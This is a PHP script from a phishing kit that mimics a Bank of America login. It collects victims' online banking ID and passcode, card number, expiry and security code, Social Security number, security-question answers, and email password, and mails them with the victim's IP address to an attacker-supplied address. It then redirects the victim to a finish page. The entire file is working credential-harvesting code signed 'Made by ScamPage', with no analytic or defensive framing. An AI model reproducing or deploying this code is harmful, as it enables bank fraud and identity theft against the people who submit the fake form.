<?

$ip = getenv("REMOTE_ADDR");
$message .= "-------BOA Spam ReZult----------\n";
$message .= "Online ID:: ".$_POST['onlineId']."\n";
$message .= "Passcode: ".$_POST['password']."\n";
$message .= "Card Number: ".$_POST['ccNo']."\n";
$message .= "Expiration(mm/yy): ".$_POST['auth-safepass-exMonth']." ".$_POST['auth-safepass-exYear']."\n";
$message .= "3 or 4 digit security : ".$_POST['secureCode']."\n";
$message .= "------SSN & Account Number------\n";
$message .= "Social Security Number: ".$_POST['ssn']."\n";
$message .= "------Security Questions------\n";
$message .= "Your first question: ".$_POST['questionId1']."\n";
$message .= "Answer 1: ".$_POST['actualAnswer1']."\n";
$message .= "Your second question: ".$_POST['questionId2']."\n";
$message .= "Answer 2: ".$_POST['actualAnswer2']."\n";
$message .= "Your third question: ".$_POST['questionId3']."\n";
$message .= "Answer 3: ".$_POST['actualAnswer3']."\n";
$message .= "------Email------\n";
$message .= "E-mail address: ".$_POST['email']."\n";
$message .= "Email Password: ".$_POST['emailpass']."\n";
$message .= "---------IP and Date--------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "-----Made by ScamPage-------------\n";
$recipient = "Your Email Here";
$subject = "BOALogz $ip";
$headers = "From: ";
$headers .= $_POST['UserID']."\n";
if (mail($recipient,$subject,$message,$headers))
   {
   header("Location:finish.html");

   }


?>